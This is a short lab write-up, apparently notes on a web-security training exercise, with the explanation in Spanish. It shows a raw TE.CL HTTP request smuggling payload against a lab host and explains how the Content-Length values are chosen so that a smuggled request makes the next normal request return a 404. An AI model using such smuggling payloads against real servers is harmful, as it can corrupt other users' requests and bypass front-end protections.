---
title: "05 - HTTP request smuggling, confirming a TE.CL vulnerability via differential responses"
---

# 05 - HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

```HTTP
POST / HTTP/1.1\r\n
Host: 0af700db040ed06784fb6e4700d700b0.web-security-academy.net\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 4\r\n
\r\n
67\r\n
POST /notFound HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
foo=bar\r\n
0\r\n
\r\n
```

El segundo content length es 14+1 porque 14 bytes son :

```HTTP
foo=bar\r\n
0\r\n
\r\n
```

y 1 extra para que cuando inicie la request normal  se devuelva la respuesta del POST  a /notFound, en concreto se devolverá un 404 de esta petición :

```HTTP
POST /notFound HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
foo=bar\r\n
0\r\n
\r\n
```
